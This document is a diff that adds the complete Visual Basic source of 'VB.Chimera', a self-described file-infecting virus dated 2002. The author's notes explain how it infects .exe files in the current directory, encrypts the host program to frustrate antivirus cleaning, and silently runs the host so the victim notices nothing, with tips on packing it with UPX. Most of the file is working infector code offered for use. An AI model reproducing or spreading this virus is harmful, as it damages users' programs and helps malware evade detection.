@@ -1,0 +1,152 @@
+   ' \\\\\\\\\\\\\\\\\\\\\\\\\\\\
+   ' VB.CHIMERA by alcopaul\\\\\\\
+   ' \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+   '
+   ' hello vb fans... :) ... i would like to present another virus..
+   '
+   ' VB.Chimera is a slow infector.... it infects one ".exe" file in current directory per virus run... it's designed to infect
+   ' all ".exe" files in current directory... infected hosts are encrypted by the virus so AVs will find it difficult to
+   ' reconstruct or "clean" the infected files... even though the host is encrypted, the virus wonderfully regenerates the
+   ' host and executes it (using vb5 virus method of executing hosts by Murkry) thus users won't recognize anything wrong
+   ' except the similar icons....
+   '
+   ' the compiled executable of the source won't immediately infect exe files (thus satisfying the definition of a biological
+   ' virus that it cannot function by itself)... you'll surely get some errors... if this happens, this means that the virus is
+   ' infecting itself (since the compiled executable doesn't contain the signature "APO" yet). but once the virus has infected
+   ' a file (not itself), the infection will continue smoothly... but if you want it to werk without errors,
+   ' just add the "APO" signature to the compiled file using copy /b...
+   '
+   ' end don't forget to compress it using upx 1.22 so the virus constant in the code and the size of the compiled executable
+   ' bytes will jive..
+   '
+   ' virus size = 6144... comparable to the size of some win32asm pe infector...
+   '
+   '
+   ' \\\\\\\\\\\\\\\\\\
+   ' the source\\\\\\\\\
+   ' \\\\\\\\\\\\\\\\\\\\
+   '
+   ' -----------------------------------------------------------------------------------------------------------------------------
+   Attribute VB_Name = "Module1"
+   Option Explicit
+   Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
+   Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
+   Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+   Private hostX As Long
+   Private ID As Long
+   Private fuckoff As Long
+   Const aktibo As Long = &H103
+   Const allproc As Long = &H1F0FFF
+   Sub Main()
+   On Error Resume Next
+   Dim virpath As String
+   Dim hosts1 As String
+   Dim a As String
+   Dim syra, genna
+   Dim hlen As String, vsig As String, marker As String
+   virpath = App.Path
+   If Right(virpath, 1) <> "\" Then virpath = virpath & "\"
+   hosts1 = Dir$(virpath & "*.exe")
+   While hosts1 <> ""
+   a = a & hosts1 & "/"
+   hosts1 = Dir$
+   Wend
+   syra = Split(a, "/")
+   For Each genna In syra
+   Open virpath & genna For Binary Access Read As #1
+   hlen = (LOF(1))
+   vsig = Space(hlen)
+   Get #1, , vsig
+   Close #1
+   marker = Right(vsig, 3)
+   If marker <> "APO" Then
+   GoTo notinfected
+   Else
+   GoTo infected
+   End If
+   notinfected:
+   inphecxion (virpath & genna)
+   Exit For
+   infected:
+   Next genna
+   reghost (virpath & App.EXEName & ".exe")
+   End Sub
+   Function inphecxion(goat As String)
+   On Error Resume Next
+   Dim hostbyte1 As String
+   Dim virbyte1 As String
+   Dim virpath As String
+   Dim sig As String
+   Dim enchost As String
+   virpath = App.Path
+   If Right(virpath, 1) <> "\" Then virpath = virpath & "\"
+   Open goat For Binary Access Read As #1
+   hostbyte1 = Space(LOF(1))
+   Get #1, , hostbyte1
+   Close #1
+   Open virpath & App.EXEName & ".exe" For Binary Access Read As #2
+   virbyte1 = Space(6144)
+   Get #2, , virbyte1
+   Close #2
+   sig = "APO"
+   enchost = x(hostbyte1)
+   Open goat For Binary Access Write As #3
+   Put #3, , virbyte1
+   Put #3, , enchost
+   Put #3, , sig
+   Close #3
+   End Function
+   Function reghost(goat As String)
+   On Error Resume Next
+   Dim hostbyte2 As String
+   Dim virbyte2 As String
+   Dim virpath As String
+   Dim dechost As String
+   virpath = App.Path
+   If Right(virpath, 1) <> "\" Then virpath = virpath & "\"
+   Open goat For Binary Access Read As #1
+   virbyte2 = Space(6144)
+   hostbyte2 = Space(LOF(1) - 6144)
+   Get #1, , virbyte2
+   Get #1, , hostbyte2
+   Close #1
+   dechost = x(hostbyte2)
+   Open virpath & "apo.com" For Binary Access Write As #2
+   Put #2, , dechost
+   Close #2
+   ID = Shell(virpath & "apo.com", vbNormalFocus)
+   hostX = OpenProcess(allproc, False, ID)
+   GetExitCodeProcess hostX, fuckoff
+   Do While fuckoff = aktibo
+   DoEvents
+   GetExitCodeProcess hostX, fuckoff
+   Loop
+   Kill virpath & "apo.com"
+   End Function
+   Function x(sText As String)
+   On Error Resume Next
+   Dim ekey As Long, i As Long
+   Dim hash As String, crbyte As String
+   ekey = 4380
+   For i = 1 To Len(sText)
+   hash = Asc(Mid(sText, i, 1))
+   crbyte = Chr(hash Xor (ekey Mod 255))
+   x = x & crbyte
+   Next i
+   End Function
+   -----------------------------------------------------------------------------------------------------------------------------
+
+
+   that's all for now...
+
+   \\\\\\\\\\\\\\\\\\\\\
+   alcopaul\\\\\\\\\\\\\\
+   \\\\\\\\\\\\\\\\\\\\\\\
+   july 18, 2002\\\\\\\\\\\
+   \\\\\\\\\\\\\\\\\\\\\\\\\
+   the philippines\\\\\\\\\\\
+   \\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   greets : arkhangel, philetoaster/[rRlf], PetiK (mail me!), Lord Julus/[TKT], ebcvg, brigada8, mAniaC89/[b8], Zirkov/[b8],
+            jackie, Dr. T, Alpha Phi Omega International Collegiate Service Fraternity, ETA chapter, Philippines, VirusBuster,
+        IllAwesome, my little sister, Syra, my parents and my girlfriend Janis...
